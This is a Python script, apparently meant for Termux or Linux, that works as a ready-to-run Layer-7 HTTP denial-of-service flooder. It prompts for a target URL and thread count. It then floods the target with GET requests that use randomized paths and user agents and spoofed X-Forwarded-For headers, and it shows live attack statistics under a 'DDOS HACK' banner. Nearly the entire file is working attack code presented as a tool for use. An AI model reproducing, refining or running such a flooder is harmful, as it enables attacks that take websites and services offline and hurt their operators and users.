# language: Python 3, file: ddos_hack.py, target: Termux / Linux
# L7 HTTP Flooder with live terminal UI. No external dependencies.
# Usage: python ddos_hack.py

import socket
import threading
import random
import time
import urllib.parse
import sys
import os
import ssl

# --- UI COLORS ---
R = '\033[91m'  # Red
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
C = '\033[96m'  # Cyan
W = '\033[0m'   # White

BANNER = f"""{R}
██████╗ ██████╗  ██████╗ ███████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
██║  ██║██║  ██║██║   ██║███████╗    ███████║███████║██║     █████╔╝ 
██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██║██╔══██║██║     ██╔═██╗ 
██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║██║  ██║╚██████╗██║  ██╗
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{W}"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
]

PATHS = ["/", "/index.php", "/api/v1", "/login", "/?s=", "/wp-admin", "/search?q=", "/assets/js/main.js", "/favicon.ico"]

req_count = 0
lock = threading.Lock()
running = True

def flood_worker(host, port, is_https):
    global req_count
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))

            if is_https:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)

            path = random.choice(PATHS) + str(random.randint(1, 999999))
            ip_spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            payload = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: no-cache\r\n"
                f"X-Forwarded-For: {ip_spoof}\r\n"
                f"\r\n"
            ).encode()

            s.sendall(payload)
            s.recv(1024) # อ่าน response นิดหน่อยเพื่อไม่ให้โดนตัด RST ทันที
            s.close()

            with lock:
                req_count += 1
        except Exception:
            with lock:
                req_count += 1 # นับยิงพลาดด้วย

def main():
    global running
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    
    target = input(f"{C} [?] Target URL (e.g., http://test.com): {W}").strip()
    if not target.startswith('http'):
        target = 'http://' + target
        
    try:
        threads = int(input(f"{C} [?] Threads (e.g., 500): {W}").strip())
    except ValueError:
        threads = 200

    parsed = urllib.parse.urlparse(target)
    host = parsed.hostname
    port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)
    is_https = parsed.scheme == 'https'

    print(f"\n{G} [+] Initializing Attack on {host}:{port}")
    print(f"{G} [+] Bypassing WAF & Firing {threads} Threads...{W}\n")
    time.sleep(1)

    for _ in range(threads):
        t = threading.Thread(target=flood_worker, args=(host, port, is_https))
        t.daemon = True
        t.start()

    start_time = time.time()
    
    try:
        while True:
            elapsed = time.time() - start_time
            rps = req_count / elapsed if elapsed > 0 else 0
            
            # แสดงผล UI แบบ Realtime
            sys.stdout.write(
                f"\r{R}[◉] ATTACKING: {W}{target[:25]}... "
                f"{R}| THREADS: {W}{threads} "
                f"{R}| SENT: {G}{req_count} "
                f"{R}| RPS: {Y}{int(rps)}{W}    "
            )
            sys.stdout.flush()
            time.sleep(0.05)
    except KeyboardInterrupt:
        running = False
        print(f"\n\n{R}[!] FIRE CEASED. Total Requests Fired: {G}{req_count}{W}")
        sys.exit(0)

if __name__ == "__main__":
    main()